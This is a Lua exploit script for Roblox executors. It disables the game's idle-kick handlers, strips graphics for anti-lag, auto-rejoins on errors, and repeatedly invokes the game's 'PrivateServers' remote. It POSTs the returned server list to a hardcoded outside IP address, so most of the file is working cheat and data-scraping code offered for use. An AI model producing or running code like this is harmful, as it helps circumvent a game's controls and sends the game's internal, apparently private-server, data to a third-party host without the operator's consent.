local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local workspace = game:GetService("Workspace")
local GuiService = game:GetService("GuiService")
local TeleportService = game:GetService("TeleportService")

-- Replace these with actual values from the game context
local PlaceId = game.PlaceId
local JobId = game.JobId

-- Remote function
local GetServers = ReplicatedStorage:WaitForChild("PrivateServers"):WaitForChild("GetServers")
local UpdateEvent = ReplicatedStorage:WaitForChild("PrivateServers"):WaitForChild("Update")
local API_URL_INFO = "http://157.245.80.25:5000/info"

local request_func = (syn and syn.request) or http_request or (fluxus and fluxus.request) or krnl_request or request
if not request_func then
    warn("No HTTP request function available in this executor.")
    return
end

-- Function to reduce lag
local function antilag()
    local Terrain = workspace:FindFirstChildOfClass('Terrain')
    if Terrain then
        Terrain.WaterWaveSize = 0
        Terrain.WaterWaveSpeed = 0
        Terrain.WaterReflectance = 0
        Terrain.WaterTransparency = 1
    end
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.FogStart = 9e9
    settings().Rendering.QualityLevel = 1

    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Material = Enum.Material.Plastic
            v.Reflectance = 0
            v.BackSurface = Enum.SurfaceType.SmoothNoOutlines
            v.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
            v.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
            v.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
            v.RightSurface = Enum.SurfaceType.SmoothNoOutlines
            v.TopSurface = Enum.SurfaceType.SmoothNoOutlines
        elseif v:IsA("Decal") then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        end
    end

    for _, v in pairs(Lighting:GetDescendants()) do
        if v:IsA("PostEffect") then
            v.Enabled = false
        end
    end

    workspace.DescendantAdded:Connect(function(child)
        task.spawn(function()
            if child:IsA('ForceField') or child:IsA('Sparkles') or child:IsA('Smoke') or child:IsA('Fire') or child:IsA('Beam') then
                RunService.Heartbeat:Wait()
                child:Destroy()
            end
        end)
    end)
    print("Anti-lag enabled")
end

-- Function to prevent AFK kick
local function antiafk()
    local GC = getconnections or get_signal_cons
    if GC then
        for _, v in pairs(GC(Players.LocalPlayer.Idled)) do
            if v["Disable"] then
                v["Disable"](v)
            elseif v["Disconnect"] then
                v["Disconnect"](v)
            end
        end
    else
        local VirtualUser = cloneref(game:GetService("VirtualUser"))
        Players.LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end
    print("Anti-AFK enabled")
end

-- Rejoin function (Inf Yield style)
local function rejoin()
    if #Players:GetPlayers() <= 1 then
        Players.LocalPlayer:Kick("\nRejoining...")
        wait()
        TeleportService:Teleport(PlaceId, Players.LocalPlayer)
    else
        TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
    end
end

-- Auto Rejoin function (Inf Yield style)
local function autorejoin()
    GuiService.ErrorMessageChanged:Connect(function()
        if #Players:GetPlayers() <= 1 then
            Players.LocalPlayer:Kick("\nRejoining...")
            wait()
            TeleportService:Teleport(PlaceId, Players.LocalPlayer)
        else
            TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
        end
    end)
    if notify then
        notify("Auto Rejoin", "Auto rejoin enabled")
    else
        print("Auto Rejoin enabled")
    end
end

-- SERVER DATA SENDER
local function sendServerData()
    task.spawn(function()
        print("Server list updated. Sending data to API...")
        local success, servers = pcall(function()
            return GetServers:InvokeServer()
        end)

        if success and servers then
            local json_body = HttpService:JSONEncode({ servers = servers })
            local api_success, api_response = pcall(function()
                return request_func({
                    Url = API_URL_INFO,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = json_body
                })
            end)

            if api_success and api_response.Success then
                print("Successfully sent server data to API")
            else
                warn("Failed to send server data to API:", api_response and api_response.StatusCode or "Unknown error")
            end
        else
            warn("Failed to get server data:", servers)
        end
    end)
end

UpdateEvent.Changed:Connect(sendServerData)
sendServerData()
print("Server data sender initialized. Will send data when servers update.")

-- Activate functions
antilag()
antiafk()
autorejoin()
